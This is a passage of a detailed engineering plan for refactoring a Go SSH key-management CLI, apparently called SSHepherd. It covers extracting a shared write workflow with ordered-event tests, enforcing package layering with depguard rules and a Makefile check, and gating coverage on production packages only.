- Modify: `cmd/sshepherd/apply.go` (`applyStage`, `applyRun`, `withheld`, `runApply`, `planFleet`, `writePhase` and `countChanges` are removed; `:126-299` is replaced by an adapter), `cmd/sshepherd/editrun.go` (`runEdit`'s hooks become a committer; `nothingCanLand`, `anySurvivor` and `anyConverged` (`:411-443`) are removed), `cmd/sshepherd/editrun_test.go` (the predicate tests `:30-65` move to `apply/predicates_test.go`), `cmd/sshepherd/json_cmd_test.go:238-249` (the `withheld` test moves to `workflow_test.go`)
- Unchanged and acting as the behavior lock: `cmd/sshepherd/{apply_test,revoke_test,revoke_server_test,rotate_test,rotate_keep_old_test,e2e_test,json_cmd_test (rest),identity_test}.go`, plus every golden

**Design:** cmd keeps everything flag, TTY and transport related: `applyPreflight`, `confirmGate`, `promptStreams`, `selectServers`, `relistPrefix`, and P06's `fleetSession` if it exists. `fleetSession` stays in cmd as the seam *builder*, not in `workflow`. That keeps `workflow` transport-free and unit-testable, and diverges deliberately from P06's "move fleetSession" suggestion. The workflow owns the ordering invariants and logs the same lines at the same moments.

- [ ] **Step 1: Write the failing tests**

`internal/apply/predicates_test.go`: move the tables from `cmd/sshepherd/editrun_test.go:30-65` verbatim, changing `nothingCanLand` to `NothingCanLand`, `anySurvivor` to `AnySurvivor` and `anyConverged` to `AnyConverged`, and add:
```go
func TestCountChanges(t *testing.T) {
	plans := []ServerPlan{{Class: ClassChange}, {Class: ClassConverged}, {Class: ClassChange}, {Class: ClassRefused}}
	if got := CountChanges(plans); got != 2 {
		t.Errorf("CountChanges = %d, want 2", got)
	}
}
```

`internal/workflow/workflow_test.go` uses hermetic fakes and records events in order:
```go
package workflow

type rec struct{ events []string }

func (r *rec) add(e string) { r.events = append(r.events, e) }

type fakeReader struct{ content map[string]string } // server name → file; missing = unreachable
func (f fakeReader) ReadAuthorizedKeys(_ context.Context, s config.Server) (fleet.ReadResult, error) {
	c, ok := f.content[s.Name]
	if !ok {
		return fleet.ReadResult{}, errors.New("dial: refused")
	}
	return fleet.ReadResult{Content: []byte(c)}, nil
}

type fakeWriter struct{ r *rec }
func (w fakeWriter) Apply(_ context.Context, s config.Server, _ fleet.WriteRequest) error {
	w.r.add("write:" + s.Name)
	return nil
}

// fixture: one server "a" granted key 1, currently empty → one change
// plan; held = key 1 (agent) so the guard passes. Built from testkeys
// like internal/apply's plan tests (testkeys.Line(t, 1)).
func fixture(t *testing.T, r *rec) Request {
	t.Helper()
	line := testkeys.Line(t, 1)
	k, err := authkeys.ParseLine(line)
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Parse([]byte("users:\n  - {name: alice, keys: [\"" + line + "\"]}\n" +
		"servers:\n  - {name: a, host: 10.0.0.1, user: deploy}\n" +
		"access:\n  - {user: alice, servers: [a]}\n"))
	if err != nil {
		t.Fatal(err)
	}
	held := []fleet.HeldKey{{Fingerprint: k.Fingerprint, Source: fleet.SourceAgent}}
	return Request{
		Cfg:      cfg,
		Servers:  cfg.Servers,
		Held:     held,
		Reader:   fakeReader{content: map[string]string{"a": ""}},
		Writer:   fakeWriter{r},
		Relister: HeldFunc(func(context.Context) ([]fleet.HeldKey, error) { r.add("relist"); return held, nil }),
		Question: func([]apply.ServerPlan, int) (string, error) { r.add("question"); return "go?", nil },
		Confirmer: ConfirmFunc(func(context.Context, string) (bool, error) { r.add("confirm"); return true, nil }),
		Committer: CommitFunc(func(context.Context, []apply.ServerPlan, []fleet.HeldKey) (bool, error) {
			r.add("commit")
			return true, nil
		}),
		Reporter: nopReporter{r},
		Parallel: 2,
		Log:      slog.New(slog.DiscardHandler),
	}
}

func TestApplyOrdering(t *testing.T) {
	r := &rec{}
	out, err := Apply(context.Background(), fixture(t, r))
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"header", "planned", "question", "confirm", "relist", "commit", "write:a"}
	if !slices.Equal(r.events, want) {
		t.Fatalf("events = %v, want %v", r.events, want)
	}
	if out.Stage != StageConfirmed || !out.Saved || out.ExitCode() != 0 {
		t.Fatalf("outcome = %+v", out)
	}
}
```
Table-driven siblings use the same fixture with one override each. Each asserts the event list and `Outcome`:

| Case | Override | Expected events | Outcome |
|---|---|---|---|
| dry run | `DryRun: true` | header, planned | `StagePlanned`, `Saved=false`, `ExitCode()==1` (pending change) |
| nothing to confirm | reader returns the desired render | header, planned | `StagePlanned`, exit 0 |
| always-confirm, no writes | converged + `AlwaysConfirm` | …, question, confirm, commit (fresh == nil, **no relist**) | `StageConfirmed`, `Saved=true` |
| declined | Confirmer returns false | …, question, confirm | `StageDeclined`, no commit, `ExitCode()==1` |
| question withholds | Question returns `ErrWithheld` | …, question | `StageWithheld`, `ExitCode()==1` |
| commit withholds | Commit returns `fmt.Errorf("x: %w", ErrWithheld)` | …, relist, commit | `StageWithheld`, `Saved=false`, plan `a` still `OutcomePending` with nil `OutcomeErr` |
| commit tool error | Commit returns `errors.New("manifest changed")` | …, commit | `err` is that error (`errors.Is`), no write |
| confirm tool error | Confirmer returns `errors.New("confirmation required…")` | …, confirm | `err` passes through verbatim |
| relist fails | Relister errors | …, relist, commit (fresh nil) | `a` → `OutcomeFailed` through the guard re-check, and the log contains the `RelistLabel` prefix |
| interrupted after read | reader cancels ctx | header | `errors.Is(err, ErrInterrupted)`, no `planned` |
| plan error | (render failure is impossible for a valid manifest) | — | skip; covered by `apply` |

Move the `withheld` test from `json_cmd_test.go:238-249` here as the "question withholds" row. `leak_test.go` uses goleak, because `Execute` starts goroutines.

- [ ] **Step 2: Run to see it fail**

`rtk proxy go test ./internal/workflow/ ./internal/apply/ -count=1` should fail with `undefined: Apply, Request, NothingCanLand, CountChanges…`.

- [ ] **Step 3: Implement**

`internal/apply/predicates.go`: move `nothingCanLand`, `anySurvivor` and `anyConverged` from `editrun.go:411-443`, and `countChanges` from `apply.go:351-360`, verbatim and exported, with `fresh []fleet.HeldKey` and using the existing `heldSet`. They sit next to the existing `ExitCode(plans)` and `Interrupted(plans)` functions over `[]ServerPlan`. A named slice type with methods would ripple through every caller.

`internal/workflow/workflow.go`:
```go
// Package workflow is the write workflow shared by apply, revoke and
// rotate. It owns the ordering every write command relies on — read and
// plan; confirm; re-list held keys; commit the manifest exactly once,
// after confirmation and before the first write; write; report the
// outcome — behind seams, so it imports no transport and no CLI.
package workflow

// Stage tells the caller how far the run got.
type Stage int

const (
	StagePlanned   Stage = iota // plan shown, nothing confirmed: dry run, or nothing to confirm
	StageDeclined               // the confirmation was declined
	StageConfirmed              // confirmed: the commit passed and the writes (if any) ran
	StageWithheld               // Question or Commit withheld the run: nothing saved or written
)

// ErrWithheld, returned (or wrapped) by Request.Question or Commit, ends
// the run as StageWithheld; it is not a tool error. The seam logs why.
var ErrWithheld = errors.New("run withheld: nothing saved or written")

// ErrInterrupted wraps ctx's error when the run was interrupted before
// the plan existed (nothing rendered, saved or written).
var ErrInterrupted = errors.New("interrupted")

type Confirmer interface{ Confirm(ctx context.Context, question string) (bool, error) }
type ManifestCommitter interface {
	// Commit runs exactly once, after confirmation and — when a server
	// will be written — after the held-key re-list (fresh), before any
	// write; fresh is nil when nothing will be written. saved reports
	// that the manifest file was written.
	Commit(ctx context.Context, plans []apply.ServerPlan, fresh []fleet.HeldKey) (saved bool, err error)
}
type Reporter interface {
	Header()                                                // before anything connects
	ReadDone(results []audit.ServerResult, start time.Time) // phase 1 finished
	Planned(plans []apply.ServerPlan)                       // the plan report
}
type HeldLister interface{ Held(ctx context.Context) ([]fleet.HeldKey, error) }

// Func adapters keep the cmd side terse.
type ConfirmFunc func(context.Context, string) (bool, error)
type CommitFunc func(context.Context, []apply.ServerPlan, []fleet.HeldKey) (bool, error)
type HeldFunc func(context.Context) ([]fleet.HeldKey, error)
// (each with its one-line method)

type Request struct {
	Cfg              *config.Config
	Servers          []config.Server // never empty
	Held             []fleet.HeldKey // preflight listing: the plan-time guard's ground truth
	Reader           audit.KeyReader
	Writer           apply.Writer
	Relister         HeldLister
	RelistLabel      string // failed re-list log prefix (cmd's relistPrefix)
	Parallel         int
	PerServerTimeout time.Duration
	DryRun           bool
	AlwaysConfirm    bool // ask even when nothing is written (the edit is itself a change)
	Question         func(plans []apply.ServerPlan, toWrite int) (string, error)
	Confirmer        Confirmer
	Committer        ManifestCommitter
	Reporter         Reporter
	Log              *slog.Logger
}

type Outcome struct {
	Stage Stage
	Saved bool
	Plans []apply.ServerPlan
}

// ExitCode is 1 when the run was withheld or declined or any server did
// not converge, else 0 (apply.ExitCode). P08-impl extends it to 2.
func (o Outcome) ExitCode() int {
	if o.Stage == StageWithheld || o.Stage == StageDeclined {
		return 1
	}
	return apply.ExitCode(o.Plans)
}

func Apply(ctx context.Context, req Request) (Outcome, error) {
	req.Reporter.Header()
	plans, err := plan(ctx, req)
	if err != nil {
		return Outcome{}, err
	}
	req.Reporter.Planned(plans)
	out := Outcome{Plans: plans}
	toWrite := apply.CountChanges(plans)
	if req.DryRun || (toWrite == 0 && !req.AlwaysConfirm) {
		out.Stage = StagePlanned
		return out, nil
	}
	return confirmAndWrite(ctx, req, out, toWrite)
}

// plan is phase 1: audit's pipeline over req.Servers, then apply.Build.
func plan(ctx context.Context, req Request) ([]apply.ServerPlan, error) {
	req.Log.Info(fmt.Sprintf("planning %d servers (parallelism %d)…", len(req.Servers), req.Parallel))
	start := time.Now()
	results := audit.Run(ctx, req.Cfg, req.Reader, audit.Options{
		Parallel: req.Parallel, PerServerTimeout: req.PerServerTimeout, Servers: req.Servers, Logger: req.Log,
	})
	req.Reporter.ReadDone(results, start)
	if err := ctx.Err(); err != nil {
		return nil, fmt.Errorf("%w: %w", ErrInterrupted, err)
	}
	plans, err := apply.Build(req.Cfg, results, req.Held)
	if err != nil {
		return nil, fmt.Errorf("plan: %w", err)
	}
	return plans, nil
}

func confirmAndWrite(ctx context.Context, req Request, out Outcome, toWrite int) (Outcome, error) {
	question, err := req.Question(out.Plans, toWrite)
	if err != nil {
		return withheld(out, err)
	}
	ok, err := req.Confirmer.Confirm(ctx, question)
	if err != nil {
		return Outcome{}, err //nolint:wrapcheck // the caller's own seam error, returned to the caller verbatim (exit-3 text is user-facing)
	}
	if !ok {
		out.Stage = StageDeclined
		return out, nil
	}
	var fresh []fleet.HeldKey
	if toWrite > 0 {
		req.Log.Info(fmt.Sprintf("applying %d servers (parallelism %d)…", toWrite, req.Parallel))
		// The prompt can wait indefinitely; agent keys may expire meanwhile.
		// A failed listing writes nothing (every guard re-check fails).
		if fresh, err = req.Relister.Held(ctx); err != nil {
			req.Log.Error(fmt.Sprintf("%s: %v — no server will be written", req.RelistLabel, err))
			fresh = nil
		}
	}
	if out.Saved, err = req.Committer.Commit(ctx, out.Plans, fresh); err != nil {
		out.Saved = false
		return withheld(out, err)
	}
	if toWrite > 0 {
		apply.Execute(ctx, out.Plans, req.Writer, apply.ExecOptions{
			Parallel: req.Parallel, PerServerTimeout: req.PerServerTimeout, Held: fresh, Logger: req.Log,
		})
		if n := apply.Interrupted(out.Plans); n > 0 {
			req.Log.Error(fmt.Sprintf("interrupted: %d servers not started (nothing written there); started writes finished", n))
		}
	}
	out.Stage = StageConfirmed
	return out, nil
}

// withheld maps ErrWithheld to StageWithheld; any other error is a tool error.
func withheld(out Outcome, err error) (Outcome, error) {
	if errors.Is(err, ErrWithheld) {
		out.Stage = StageWithheld
		return out, nil
	}
	return Outcome{}, err //nolint:wrapcheck // the caller's own seam error, returned verbatim
}
```
The ordering matches today's `runApply`/`writePhase` exactly: the "applying" log comes before the re-list (`apply.go:221` vs `:270`), and with `toWrite == 0` the commit gets `nil` with no re-list (`:214-218`). Both funcs stay under `gocyclo` 15.

`cmd/sshepherd/apply.go`: replace `applyRun` with an adapter that keeps the same signature for both callers:
```go
// applySpec is what apply, revoke and rotate vary; runWorkflow maps it to
// a workflow.Request and the Outcome to the finish callback.
type applySpec struct {
	cfg, former   *config.Config
	formerNote    string
	servers       []config.Server
	preferKeys    func(config.Server) []string
	header        func(io.Writer)
	alwaysConfirm bool
	question      func([]apply.ServerPlan, int) (string, error) // returns workflow.ErrWithheld to withhold
	commit        workflow.CommitFunc
	finish        func(workflow.Outcome) error
}

func runWorkflow(cmd *cobra.Command, a *app, stdout io.Writer, rf *runFlags, ids identities, s applySpec) error {
	ctx, log := cmd.Context(), a.logger
	pre, err := applyPreflight(ctx, log, rf.knownHosts, ids)
	if err != nil {
		return err
	}
	dialer := &sshconn.Dialer{KnownHostsPath: pre.khPath, KnownHosts: pre.kh, Creds: pre.creds,
		DialTimeout: dialTimeout, PreferKeys: s.preferKeys, Log: log}
	out, err := workflow.Apply(ctx, workflow.Request{
		Cfg: s.cfg, Servers: s.servers, Held: pre.held,
		Reader: &sshread.Client{KnownHostsPath: pre.khPath, KnownHosts: pre.kh, Creds: pre.creds,
			DialTimeout: dialTimeout, PreferKeys: s.preferKeys, Log: log},
		Writer:   &sshwrite.FleetWriter{Dialer: dialer, Log: log},
		Relister: pre.creds, RelistLabel: relistPrefix(pre.creds),
		Parallel: rf.parallel, PerServerTimeout: perServerTimeout,
		DryRun: rf.dryRun, AlwaysConfirm: s.alwaysConfirm, Question: s.question,
		Confirmer: workflow.ConfirmFunc(func(_ context.Context, q string) (bool, error) { return confirmGate(cmd, rf.yes, q) }),
		Committer: s.commit,
		Reporter:  textReporter{json: rf.json, stdout: stdout, log: log, cfg: s.cfg, header: s.header,
			ropts: apply.RenderOptions{Color: a.reportColor, Former: s.former, FormerNote: s.formerNote}},
		Log: log,
	})
	if errors.Is(err, workflow.ErrInterrupted) {
		return interrupted(ctx) // same exit-3 text as today
	}
	if err != nil {
		return err
	}
	return s.finish(out)
}
```
In `textReporter`, `Header` prints the header only when `!json && header != nil` (as in `apply.go:182-184`). `ReadDone` calls `logFleetReadDone(log, cfg, results, start)` in every mode. `Planned` calls `apply.Render` only when `!json` (`:193-195`). Note that `preflight` is unchanged, and the header now prints *after* preflight. That is a real ordering change: today the header prints before preflight (`:182-187`). To keep today's order, print `s.header` in `runWorkflow` **before** `applyPreflight` and make `Reporter.Header` a no-op in cmd. Then `TestRevoke*` header ordering and the stderr/stdout interleaving tests stay unchanged. The workflow still calls `Header()`, so a future library caller gets the hook.

- Plain apply (`apply.go:84-117`): `question` returns the same string. `commit` is `func(...) (bool, error) { return false, m.Unchanged() }`, or P12's store equivalent. `finish` takes `out` and switches on `out.Stage` exactly like today's closure (`stageDeclined` becomes `workflow.StageDeclined`). `finishDoc(doc, plans, stage, saved)` becomes `finishDoc(doc, out)`: render, then `if out.ExitCode() != 0 { return errNonCompliant }`. That is the same mapping as `editrun.go:328-336`, because `ExitCode()` already treats withheld as 1.
- `runEdit` (`editrun.go:214-262`): the `saved` closure variable disappears. `question` returns `workflow.ErrWithheld` instead of `errNonCompliant` when `apply.NothingCanLand(plans)` (the log line is unchanged). `commit` holds today's `beforeWrite` body: the ctx check, then `apply.CountChanges(plans) > 0 && !apply.AnySurvivor(plans, fresh) && !apply.AnyConverged(plans)`, which logs and returns `false, workflow.ErrWithheld`, then `saveEdit`, then `return true, nil`. `finish` calls `finishEdit(..., out)` and reads `out.Stage` and `out.Saved`.
- Delete `applyStage`, the `stage*` constants, `applyRun`, `withheld`, `runApply`, `planFleet`, `writePhase`, `countChanges`, `nothingCanLand`, `anySurvivor` and `anyConverged` from cmd. `deadcode` must report nothing left.

- [ ] **Step 4: Run to see it pass**

```sh
rtk proxy go test ./internal/workflow/ ./internal/apply/ -count=1 -race
rtk proxy go test ./cmd/sshepherd/ -count=1 -race          # the behavior lock, unchanged tests
git diff --stat -- cmd/sshepherd/*_test.go                 # only editrun_test.go and json_cmd_test.go (moved tests) and import lines
git diff --stat -- '*.golden' '*.golden.json'              # empty
go list -deps ./internal/workflow | grep -E 'SSHepherd/internal/(sshconn|sshread|sshwrite|keyfile)$|spf13/cobra$|golang.org/x/term$' && echo FAIL || echo OK
make check && make integration                             # integration includes the E2E loop and headless rotate
```

**Risk:**
- Output ordering. Header vs preflight is handled as described above. The log lines "planning…", "done in…", "applying…" and "interrupted: N servers not started…" must stay byte-identical. `TestApplyJSON*` and the stderr assertions in `apply_test.go` catch drift.
- `--json` with the withheld paths: `finishDoc` must still render a document when the stage is withheld (`json_cmd_test.go` covers it).
- cmd's coverage drops as logic leaves it, and `workflow` gains it. TST-7's measurement runs after this step for that reason.

---

#### Task S5 — ARC-8: machine-enforced layering (Lane B, its own round after S4)

**Files:** `.golangci.yml` (`linters.settings.depguard.rules`), `Makefile` (new `layering` target, added to `check`)

- [ ] **Step 1: Write the failing check.** First the probe, run in a scratch worktree only and never committed:
```sh
cat > internal/apply/zz_layering_probe.go <<'EOF'
package apply

import _ "github.com/javadh75/SSHepherd/internal/sshconn"
EOF
golangci-lint run ./internal/apply/...   # before the rules: no depguard finding (FAIL of the gate's intent)
```
Repeat the probe with `internal/sshconn/zz_probe.go` importing `internal/audit` (after S2 this is no longer a cycle, because `audit` no longer reaches `sshconn`), `internal/workflow/zz_probe.go` importing `github.com/spf13/cobra`, and `internal/fleet/zz_probe.go` importing `golang.org/x/crypto/ssh`.

- [ ] **Step 2: Implement.** Append to `depguard.rules` (lax lists; deny entries are prefixes, so `internal/sshconn` also covers `sshconn/sshtest`):
```yaml
        # Layering (ARC-8). Domain packages never reach the transport, the
        # terminal or the CLI; they talk to it through seams (audit.KeyReader,
        # apply.Writer, workflow interfaces) and the internal/fleet vocabulary.
        domain:
          list-mode: lax
          files:
            - "**/internal/config/*.go"
            - "**/internal/authkeys/*.go"
            - "**/internal/manifest/*.go"
            - "**/internal/reconcile/*.go"
            - "**/internal/adopt/*.go"
            - "**/internal/apply/*.go"
            - "**/internal/audit/*.go"
            - "**/internal/workflow/*.go"
          deny:
            - pkg: github.com/javadh75/SSHepherd/internal/sshconn
              desc: domain code must not import the SSH transport; use internal/fleet types and the seams
            - pkg: github.com/javadh75/SSHepherd/internal/sshread
              desc: domain code must not import the read transport; depend on audit.KeyReader
            - pkg: github.com/javadh75/SSHepherd/internal/sshwrite
              desc: domain code must not import the write transport; depend on apply.Writer
            - pkg: github.com/javadh75/SSHepherd/internal/keyfile
              desc: key-file loading is transport/CLI wiring
            - pkg: golang.org/x/term
              desc: terminal handling belongs in cmd
            - pkg: golang.org/x/crypto/ssh/agent
              desc: agent access belongs in sshconn
            - pkg: github.com/spf13/cobra
              desc: the CLI framework belongs in cmd/sshepherd
        # Transport never depends on the domain (the ARC-3 inversion).
        transport:
          list-mode: lax
          files:
            - "**/internal/sshconn/*.go"
            - "**/internal/sshread/*.go"
            - "**/internal/sshwrite/*.go"
          deny:
            - pkg: github.com/javadh75/SSHepherd/internal/audit
              desc: transport must not import audit; shared types live in internal/fleet
            - pkg: github.com/javadh75/SSHepherd/internal/apply
              desc: transport must not import apply; shared types live in internal/fleet
            - pkg: github.com/javadh75/SSHepherd/internal/adopt
              desc: transport must not import the domain
            - pkg: github.com/javadh75/SSHepherd/internal/workflow
              desc: transport must not import the workflow
            - pkg: github.com/spf13/cobra
              desc: the CLI framework belongs in cmd/sshepherd
        # internal/fleet is the leaf: standard library only (tests may use goleak).
        fleet-leaf:
          list-mode: strict
          files:
            - "**/internal/fleet/*.go"
            - "!$test"
          allow:
            - $gostd
```
`audit` and `workflow` are added beyond the finding's list on purpose. `audit` owns the reader seam and `workflow` is meant to be transport-free, so both must stay clean. The rules include test files (except `fleet-leaf`'s goleak), because after S3 no domain test imports the transport. Verify that with the `grep` in the acceptance list. Check the `files` glob semantics on v2.15.0 with the probes: a negated `!$test` entry excludes files, and the positive globs are OR-ed.

`Makefile`: depguard sees only direct imports, so add a transitive check and put it in `check`:
```make
# Transitive import assertions depguard cannot express (it checks direct
# imports only): apply/workflow/fleet never pull in the transport, the
# terminal or the CLI, and the transport never pulls in the domain.
LAYER_DOMAIN_BAN := SSHepherd/internal/(sshconn|sshread|sshwrite|keyfile)$$|golang.org/x/term$$|golang.org/x/crypto/ssh/(agent|knownhosts)$$|spf13/cobra$$
LAYER_TRANSPORT_BAN := SSHepherd/internal/(audit|apply|adopt|workflow)$$

## layering: fail when the import graph breaks the documented package layers
layering:
	@bad=$$($(GO) list -deps ./internal/apply ./internal/workflow ./internal/fleet | grep -E '$(LAYER_DOMAIN_BAN)'); \
	bad2=$$($(GO) list -deps ./internal/sshconn ./internal/sshread ./internal/sshwrite | grep -E '$(LAYER_TRANSPORT_BAN)'); \
	if [ -n "$$bad$$bad2" ]; then printf '%s\n%s\n' "$$bad" "$$bad2"; echo "FAIL: layering"; exit 1; fi
```
Change `check: tidy fmt vet lint deadcode security coverage` to `check: tidy fmt vet lint layering deadcode security coverage`, and add `layering` to `.PHONY`.

- [ ] **Step 3: Run.** Each Step-1 probe now produces a depguard finding naming the rule's `desc`. Delete the probes. `make lint layering` passes on the S4 tree. As a negative test of `layering`, temporarily make `internal/audit` import `internal/sshread` in the scratch worktree; `make layering` must print `FAIL: layering`.

---

#### Task S6 — TST-7: production-only coverage and the ratchet (Lane B)

**Files:** `Makefile` (`COVERAGE_MIN`, `coverage` target), README (`make` lines), CLAUDE.md (Testing bullet)

- [ ] **Step 1: Failing check.** Run `make coverage COVERAGE_MIN=0 && grep -cE '/internal/(sshconn/sshtest|testkeys)/' coverage.out`. Today it prints a non-zero count (the helpers are in the profile).

- [ ] **Step 2: Implement.** Filter **in place**, so CI's artifact names (`coverage.out`, `coverage.html`, `ci.yml:50-51`) do not change and P02/P13's `ci.yml` stays untouched:
```make
# Test-support packages: linked only into tests, so their own-package 0%
# would dilute the production figure. Excluded from the gated profile.
COVER_EXCLUDE := /internal/sshconn/sshtest/|/internal/testkeys/

coverage: test
	@{ head -n1 $(COVERPROFILE); tail -n +2 $(COVERPROFILE) | grep -Ev '$(COVER_EXCLUDE)'; } > $(COVERPROFILE).tmp && mv $(COVERPROFILE).tmp $(COVERPROFILE)
	$(GO) tool cover -func=$(COVERPROFILE)
	... (unchanged gate lines)
```
After S2–S5 have landed (S1's change landed in W1 as P07 Task 7), measure with `make coverage COVERAGE_MIN=0 | tail -1`. Then set `COVERAGE_MIN := <floor(total) − 1>`, with a comment: `# Ratchet: floor(measured production total) − 1, measured <date> at <commit>; raise it, never lower it.` Today's measurement, without `-race` and on `adee207`, is **94.4%**, so expect `93`. The package stub's "≈89" assumed the helpers stayed in the denominator. A per-package gate for `sshwrite`, `apply` and `manifest` is **not** added (see Out of scope).

- [ ] **Step 3: Run.** `make coverage` passes and prints `coverage X% meets the 93% minimum`. `grep -cE '/internal/(sshconn/sshtest|testkeys)/' coverage.out` prints `0`. `make coverage COVERAGE_MIN=99` fails.

- [ ] **Docs (integrator).** README `:1466` and `:1468`: change "(≥80%)" and "fails below 80% line coverage" to the new number, "production packages; test helpers excluded". CLAUDE.md Testing: "fails below the 80% line-coverage minimum" becomes "fails below the `COVERAGE_MIN` line-coverage minimum (currently 93%, production packages only — `internal/sshconn/sshtest` and `internal/testkeys` are excluded)".

---

#### Integrator: README / CLAUDE.md (same commits as the code)

- **README Layout** (`README.md:1510-1530`). Add `internal/fleet/` ("shared leaf vocabulary: error kinds, read result, held keys, write request — stdlib only") and `internal/workflow/` ("the write workflow for apply/revoke/rotate: plan → confirm → commit manifest → write, behind seams"). Reword `internal/apply/` to "plan computation, self-lockout guard, phase-2 fan-out behind the Writer seam, plan/JSON reports — no transport imports". Drop "error kinds" from the `internal/sshconn/` line. Add `make layering` to the make-target list near `:1466`.
- **CLAUDE.md Status** (`CLAUDE.md:276`). Replace "`internal/apply` (pure plan/guard/report)" with "`internal/apply` (plan/guard and the phase-2 fan-out behind a writer seam; it imports no transport; it still holds the revoke/rotate presentation, which follow-up F-ARC-4b would move out)", so CLAUDE.md no longer calls it pure. Append a sentence: "A layering pass (P14) moved the shared vocabulary (error kinds, `ReadResult`, `HeldKey`, the write request and refusal marker) into the stdlib-only leaf `internal/fleet`, moved the write workflow out of `package main` into `internal/workflow` (`Apply(ctx, Request)` → `Outcome{Stage, Saved, Plans}`), enforces the layers with path-scoped depguard rules plus `make layering`, and gates coverage on production packages (`COVERAGE_MIN` 93)." Also update the `CLAUDE.md` Testing coverage bullet as in S6.
- Re-copy no samples: nothing rendered changes (the README `error_kind` sentence already landed with P07 Task 7 in W1).

#### Verification summary

- **Unit:** `fleet`, `workflow`, `apply/predicates` (the ARC-3 `json_test`/`sshwrite` contract tests landed with P07 Task 7). All existing package tests pass with renames only.
- **Behavior lock:** the cmd tests (`apply_test`, `revoke_test`, `revoke_server_test`, `rotate_test`, `rotate_keep_old_test`, `json_cmd_test`, `identity_test`, `e2e_test`) pass unchanged. Golden diff is empty.
- **Integration/E2E:** `make integration` after S3, S4 and S6. It runs the dockerized sshd matrix, the refusal and lockout paths, the adopt → apply → revoke → audit → rotate loop and headless rotate.
- **Static:** `make lint` (depguard probes), `make layering`, `deadcode ./cmd/sshepherd` (empty: no orphaned wrappers), `go list` assertions.
- **Independent verifier** (after S6): re-runs the acceptance list, re-does the S5 probes, greps for any remaining `audit.ErrorKind`/`sshconn.HeldKey`/`sshwrite.IsRefusal`, and diffs `go doc ./internal/apply` before and after for unintended exported-API churn.
- **Repair pass:** fixes only what the verifier reports, then the integrator re-runs the acceptance list and commits.

#### Acceptance

```sh
make check                      # tidy fmt vet lint layering deadcode security coverage (COVERAGE_MIN = floor(measured)−1)
make integration
deadcode ./cmd/sshepherd        # empty
go test -race -count=1 ./...
go list -deps ./internal/apply ./internal/workflow ./internal/fleet | grep -E 'SSHepherd/internal/(sshconn|sshread|sshwrite|keyfile)$|golang.org/x/term$|golang.org/x/crypto/ssh/(agent|knownhosts)$|spf13/cobra$'   # no output
go list -deps ./internal/sshconn ./internal/sshread ./internal/sshwrite | grep -E 'SSHepherd/internal/(audit|apply|adopt|workflow)$'   # no output
go list -f '{{join .Imports "\n"}}' ./internal/fleet | grep -v -E '^(context|errors|net)$'   # no output
grep -rnE 'audit\.(ErrorKind|KindedError|ReadResult|Hinted|HintOf)|sshconn\.(HeldKey|SourceAgent)|sshwrite\.(IsRefusal|ErrNotStarted)' --include='*.go' .   # no output
grep -rnE '"github.com/javadh75/SSHepherd/internal/(sshconn|sshwrite|sshread)"' internal/apply internal/audit internal/adopt internal/workflow   # no output (tests included)
git diff adee207 --stat -- '*.golden' '*.golden.json'   # only changes made by earlier packages; none by P14
grep -cE '/internal/(sshconn/sshtest|testkeys)/' coverage.out   # 0
```

#### Out of scope

- **Splitting the renderers** (`apply/report.go`, `apply/json.go`, `apply/edit.go`) into `apply/report` or `internal/report`. ARC-4 calls this optional. It is not trivial, because `edit.go` is P06's, `json.go` is P07's, and goldens move with it. Defer it to its own package if ever needed.
- **Moving P06's `fleetSession` into `workflow`.** It builds transport seams, so it stays in cmd, or later goes to a dedicated wiring package.
- **Per-package coverage gates** for `sshwrite`, `apply` and `manifest` (an option in TST-7's fix). The single production gate at 93 already sits above every write-path package's floor. Revisit if a package drops more than 2 points.
- **`go-arch-lint`** (optional in ARC-8). depguard plus `make layering` cover the same ground with no new tool.
- **Exit code 2 for apply** (`lockout_unrestored`, D10) and **UNPROVEN** (D9). Those are P08-impl. `Outcome.ExitCode()` is the hook it extends.
- Anything on hold (prune, `apply --force`, `import --prefer`, key generation/scheduled rotation, move-key, apply wipe/empty-server mode). ARC-2's "scheduled rotate" impact note is not acted on. `internal/workflow` only removes the cobra dependency and adds no scheduling.
- Any change to manifest schema, CLI flags, text output or exit codes.

---

## Wave 4 — revocation memory (P04-impl)

**Starts when all hold:** W3 (P14) is committed; D28, D29, D1–D5, D4b, D1a, D1b, D1c, D2a, D4a, D4c, D1d and D1e are answered; P04's spec is approved; and a writing-plans plan for it exists (`docs/superpowers/plans/2026-11-xx-revocation-memory.md`, same format as this file), **written after P14 landed** so its file lists name `internal/fleet` and `internal/workflow`.

It touches `internal/config`, `internal/manifest`, `internal/authkeys/render.go`, `internal/adopt`, `internal/reconcile`, `internal/audit`, `internal/apply/{plan,affected}.go`, `internal/sshwrite/sshwrite.go`, `internal/workflow` and `cmd/sshepherd/{revoke,rotate,editrun,adopt,import,manifest_out}.go`, so it runs alone. P04's "Implementation outline" (in its Wave 0 section above) splits it into **W4a** (schema + header, 2 parallel agents, plus a failing-first E2E lane) and **W4b** (adopt/reconcile/plan, audit, cmd; 3 parallel agents against the merged W4a API). The README Exit codes row is rewritten from the shared exit-code table (D28).

Traps the plan must carry: the exact first-line header compare in `internal/sshwrite/sshwrite.go:205-206` (`.orig` decision) and the rendered-bytes diff in `internal/apply/affected.go:45-51` must both ignore the header serial; plain `adopt` must round-trip `revoked:` and `serial:` through the P12 encoder (`schema_roundtrip_test.go` catches a miss); both top-level key gates (`config` `KnownFields`, `manifest.checkTopLevelKeys`, and any gate in P12's `store.go`) must accept the new keys.

---

## Wave 5 and later — spec-gated slices

Each item below gets its own writing-plans plan after its decisions (committed before its wave), and its own wave run through the same workflow skeleton. None starts before W4 is committed: each touches files P14 (W3) moves, and the schema slices compose with P04-impl's `revoked:`/`serial:`. The P10 roadmap spec itself is written after W4, and its slices are ordered by the owner's answers (asked D25 → D23 → D24 → D26 → D21 → D20 → D20b → D22).

| Slice | From | Waits for | Must come after | Notes |
|---|---|---|---|---|
| **P08-impl** write-failure semantics | P08 | D9, D9b, D10 (D11–D13 stated), D28 | P11, P14, P04-impl | Re-target to `internal/fleet`/`internal/workflow`. Lock-owner record rebases on P11's lock code. Needs P03's changeable `sshtest` key list. Keep `TestWriteCmdOrder` and `TestProbeOfferEqualsProductionOffer` green. Exit rows come from the shared D28 table; the apply JSON contract widens to exit 0, 1 or 2. Probe verdicts sort by stage; the reconnect re-reads under the lock. |
